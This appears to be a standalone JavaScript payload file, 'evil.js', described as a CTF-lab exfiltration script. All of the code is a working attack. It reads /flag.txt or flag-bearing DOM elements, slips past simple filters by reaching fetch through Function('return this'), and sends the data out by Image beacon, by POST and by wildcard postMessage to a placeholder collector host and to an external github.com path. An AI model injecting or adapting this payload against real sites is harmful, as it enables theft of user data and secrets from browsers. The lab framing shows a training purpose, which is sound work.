// evil.js
// Simple exfiltration payload for CTF labs.
// Fetches /flag.txt and sends it to attacker endpoint using Image beacon.
// Also tries postMessage fallback and obfuscated fetch to bypass trivial filters.

(async () => {
  try {
    // Try normal fetch first
    let resp;
    try {
      resp = await fetch('/flag.txt');
    } catch(e) {
      // fallback: obtain fetch from global if direct name is filtered
      const F = Function('return this')().fetch;
      resp = await F('/flag.txt');
    }

    if (!resp || !resp.ok) {
      // If no response, try to read DOM (maybe flag injected in DOM)
      try {
        const el = document.querySelector('[data-flag], #flag, .flag');
        const txt = el ? (el.textContent || el.value || '') : null;
        if (txt) {
          // send via image
          new Image().src = 'https://YOURCOLLECTDOMAIN/collect?f=' + encodeURIComponent(txt);
        }
      } catch(_) {}
      return;
    }

    const flag = await resp.text();

    // 1) Primary: Image beacon (works without CORS)
    try {
      new Image().src = 'https://github.com/Dot-Ad/test/collect?f=' + encodeURIComponent(flag);
    } catch (e) {}

    // 2) Secondary: POST (might be blocked by CORS)
    try {
      await fetch('https://github.com/Dot-Ad/test/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'flag=' + encodeURIComponent(flag)
      });
    } catch(e) {}

    // 3) Tertiary: parent.postMessage if parent listens
    try {
      parent.postMessage({type:'ctf-leak', data: flag}, '*');
    } catch(e) {}

  } catch (finalErr) {
    // best-effort logging — try to exfiltrate error
    try { new Image().src = 'https://github.com/Dot-Ad/test/collect?err=' + encodeURIComponent(String(finalErr)); } catch(_) {}
  }
})();

